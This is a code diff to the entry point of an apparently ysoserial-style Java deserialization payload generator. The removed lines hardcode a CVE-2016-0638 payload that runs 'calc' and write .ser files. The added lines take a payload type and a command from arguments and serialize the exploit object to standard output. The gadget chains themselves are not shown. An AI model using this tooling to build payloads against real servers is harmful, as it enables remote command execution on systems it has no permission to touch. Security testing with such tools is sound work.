@@ -16,15 +16,12 @@ public class GeneratePayload {
     private static final int USAGE_CODE = 64;
 
     public static void main(final String[] args) {
-//		if (args.length != 2) {
-//			printUsage();
-//			System.exit(USAGE_CODE);
-//		}
-//		final String payloadType = args[0];
-//		final String command = args[1];
-        String[] argss = new String[]{"CVE_2016_0638", "calc"};
-        final String payloadType = argss[0];
-        final String command = argss[1];
+		if (args.length != 2) {
+			printUsage();
+			System.exit(USAGE_CODE);
+		}
+		final String payloadType = args[0];
+		final String command = args[1];
 
         final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
         if (payloadClass == null) {
@@ -37,27 +34,9 @@ public class GeneratePayload {
         try {
             final ObjectPayload payload = payloadClass.newInstance();
             final Object object = payload.getObject(command);
-//            PrintStream out = System.out;
-//            Serializer.serialize(object, out);
-//            ObjectPayload.Utils.releasePayload(payload, object);
-            String flag = "";//todo: controller
-            if (flag.equals("print")) {
-                PrintStream out = System.out;
-                Serializer.serialize(object, out);
-                ObjectPayload.Utils.releasePayload(payload, object);
-            } else {//write
-                String filename;
-                String filepath = ".\\ser\\";
-                if (payloadType.contains("CommonsCollections")) {
-                    filename = filepath + "cc" + payloadType.substring("CommonsCollections".length()) + ".ser";
-                } else {
-                    filename = filepath + payloadType + ".ser";
-                }
-                ObjectOutputStream outputStream = null;
-                outputStream = new ObjectOutputStream(new FileOutputStream(filename));
-                outputStream.writeObject(object);
-                outputStream.close();
-            }
+            PrintStream out = System.out;
+            Serializer.serialize(object, out);
+            ObjectPayload.Utils.releasePayload(payload, object);
         } catch (Throwable e) {
             System.err.println("Error while generating or serializing payload");
             e.printStackTrace();
